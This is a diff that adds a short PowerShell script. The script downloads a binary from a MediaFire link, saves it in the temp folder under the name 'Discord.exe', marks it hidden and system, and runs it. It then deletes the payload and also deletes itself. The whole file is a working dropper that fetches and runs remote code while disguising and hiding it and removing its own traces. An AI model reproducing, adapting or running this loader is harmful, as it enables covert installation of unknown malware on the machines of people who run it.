@@ -1,0 +1,52 @@
+
+$url = "https://download848.mediafire.com/o3k5s7mr66zg8GjysaP0M-H_Iorf9NxXrFnjnBaQAMlOIanYNI4lKn-I0DwGQ6dniB9tZ3DOk-POix_MFMMxAN0kC_lUCFxzUDQH0CQKKNkdIvB2pg2r5annmuBsdkhmCZD8byVI2rpdH1enbcnz434E4brPdz35IgNJHQhz5-uT/s1mnyv77ws4fr7x/asdadadadasdad.bin"
+
+$dest = "$env:TEMP\Discord.exe"
+
+
+
+try {
+
+
+
+    Invoke-WebRequest -Uri $url -OutFile $dest
+
+
+
+
+
+    Set-ItemProperty -Path $dest -Name Attributes -Value ([System.IO.FileAttributes]::Archive -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
+
+
+
+
+
+    Start-Process -FilePath $dest -Wait
+
+
+
+    Write-Host "Execution completed."
+
+}
+
+catch {
+
+    Write-Error "An error occurred: $_"
+
+}
+
+finally {
+
+
+
+    if (Test-Path $dest) {
+
+        Remove-Item -Path $dest -Force
+
+    }
+
+
+
+    Remove-Item $MyInvocation.MyCommand.Definition -Force
+
+}
